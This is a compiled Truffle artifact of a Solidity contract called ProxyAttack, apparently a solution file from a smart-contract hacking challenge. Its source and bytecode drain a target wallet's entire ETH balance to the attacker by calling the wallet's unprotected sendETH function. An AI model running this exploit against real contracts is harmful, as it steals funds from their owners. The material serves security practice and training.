{
  "contractName": "ProxyAttack",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "run",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610213806100606000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063522bb70414610030575b600080fd5b61004a60048036038101906100459190610108565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1663c664c7148273ffffffffffffffffffffffffffffffffffffffff163160008054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518363ffffffff1660e01b81526004016100be92919061014f565b600060405180830381600087803b1580156100d857600080fd5b505af11580156100ec573d6000803e3d6000fd5b5050505050565b600081359050610102816101c6565b92915050565b60006020828403121561011a57600080fd5b6000610128848285016100f3565b91505092915050565b61013a8161018a565b82525050565b610149816101bc565b82525050565b60006040820190506101646000830185610140565b6101716020830184610131565b9392505050565b60006101838261019c565b9050919050565b60006101958261019c565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6101cf81610178565b81146101da57600080fd5b5056fea2646970667358221220fb557e6c2827af396009d6f8302dc6fe3924099387f4ace01981ae3b5ac0568b64736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity >= 0.8.0;\n\ninterface Wallet {\n    function sendETH(uint256 _amount, address payable _recipient) external;\n}\n\ncontract ProxyAttack {\n    \n    address payable owner;\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n    \n    function run(address _address) external {\n        Wallet(_address).sendETH(address(_address).balance, owner);\n    }\n}",
  "sourcePath": "/Users/simonperriard/Documents/Personnal/HackTheContract_Solutions/contracts/attacks/09.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.2",
  "updatedAt": "2021-08-18T07:32:40.522Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}